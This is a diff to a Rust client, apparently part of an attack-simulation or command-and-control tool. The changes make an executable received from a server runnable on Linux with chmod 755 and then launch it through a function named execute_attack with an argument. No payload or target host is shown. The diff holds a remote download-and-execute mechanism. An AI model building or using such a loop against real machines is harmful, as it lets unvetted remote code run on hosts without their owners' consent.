@@ -17,11 +17,14 @@ use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvI
 use serde::{Deserialize, Serialize};
 use generic_array::GenericArray;
 use base64::{Engine as _, engine::general_purpose};
-use std::fs::{File};
+use std::fs::{self, File};
 use std::path::Path;
 
 type Aes128CbcEnc = cbc::Encryptor<aes::Aes128>;
 type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
+
+#[cfg(client_os = "linux")]
+use std::os::unix::fs::PermissionsExt;
 
 // JSON config handshake
 #[derive(Serialize, Deserialize)]
@@ -236,6 +239,14 @@ fn check_and_request_executable(
         let mut file = File::create(&executable_path)?;
         file.write_all(&data_file)?;
 
+        #[cfg(client_os = "linux")]
+        {
+            let metadata = file.metadata()?;
+            let mut permissions = metadata.permissions();
+            permissions.set_mode(0o755); // rwxr-xr-x
+            fs::set_permissions(&executable_path, permissions)?;
+        }
+
         println!("\t\t[+] Executable received and stored at {:?}", executable_path);
     } else {
         println!("\t[+] Executable found at {:?}", executable_path);
@@ -263,7 +274,7 @@ fn execute_attack(
     #[cfg(client_os = "linux")]
     let executable_path = Path::new(executable_dir).join(attack_name);
 
-    std::process::Command::new(executable_path).spawn()?.wait()?;
+    std::process::Command::new(executable_path).arg("10").spawn()?.wait()?;
 
     Ok(())
 }
